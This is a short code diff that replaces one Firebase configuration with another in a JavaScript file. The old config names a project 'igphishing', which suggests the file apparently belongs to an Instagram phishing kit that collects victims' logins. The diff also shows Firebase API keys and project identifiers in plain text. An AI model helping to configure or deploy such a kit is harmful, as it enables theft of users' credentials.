@@ -3,15 +3,16 @@
 
 ///Edit Under This only
 
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
 const firebaseConfig = {
-  apiKey: "AIzaSyCFXiZpJx3nLQqGUkNdjWXMw9SLUIPj3uU",
-  authDomain: "igphishing.firebaseapp.com",
-  databaseURL: "https://igphishing.firebaseio.com",
-  projectId: "igphishing",
-  storageBucket: "igphishing.appspot.com",
-  messagingSenderId: "822589058510",
-  appId: "1:822589058510:web:1c0272a99a6ce86f45cf9f",
-  measurementId: "G-4LXM2KKD83"
+  apiKey: "AIzaSyAFcpEPUrbeFyzz9eaRCJ__G1T5WmQXVDo",
+  authDomain: "end-game-e2d7c.firebaseapp.com",
+  databaseURL: "https://end-game-e2d7c-default-rtdb.firebaseio.com",
+  projectId: "end-game-e2d7c",
+  storageBucket: "end-game-e2d7c.appspot.com",
+  messagingSenderId: "296793719044",
+  appId: "1:296793719044:web:5a3c3fcd427129c8a95051",
+  measurementId: "G-NS04BYJHD2"
 };
 
      
